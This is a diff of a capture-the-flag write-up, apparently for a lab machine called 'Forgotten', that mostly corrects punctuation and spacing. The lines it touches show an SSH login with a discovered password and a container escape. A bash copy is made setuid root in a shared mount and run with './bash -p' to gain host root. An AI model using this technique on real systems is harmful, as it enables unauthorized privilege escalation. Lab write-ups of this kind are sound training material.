@@ -187,7 +187,7 @@ User limesvc may run the following commands on efaa6f5097ed:
     (ALL : ALL) ALL
 ```
 
-Attempting an SSH login to limesvc with the discovered password; the authentication succeeded and the SSH session is established.
+Attempting an SSH login to limesvc with the discovered password, the authentication succeeded and the SSH session is established.
 
 ```
 ➜  Forgotten ssh limesvc@10.129.234.81
@@ -199,13 +199,14 @@ user.txt
 
 ### Privilege Escalation 
 
-We had root on the container but lacked host-level privileges. Enumeration revealed a directory mounted into both the container and the host. By placing a privileged shell binary into that shared directory, we were able to escalate privileges and obtain root on the host
-On the container:
+We had root on the container but lacked host-level privileges. Enumeration revealed a directory mounted into both the container and the host. By placing a privileged shell binary into that shared directory, we were able to escalate privileges and obtain root on the host.
+On the container we run:
 
 ```
 root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash .
 root@efaa6f5097ed:/var/www/html/survey# chmod 6777 bash
 ```
+
 On the host:
 
 ```
@@ -215,6 +216,7 @@ limesvc@forgotten:/opt/limesurvey$ ./bash -p
 bash-5.1# id
 uid=2000(limesvc) gid=2000(limesvc) euid=0(root) egid=0(root) groups=0(root),2000(limesvc)
 ```
+
 Now just take the root flag.
 
 ```
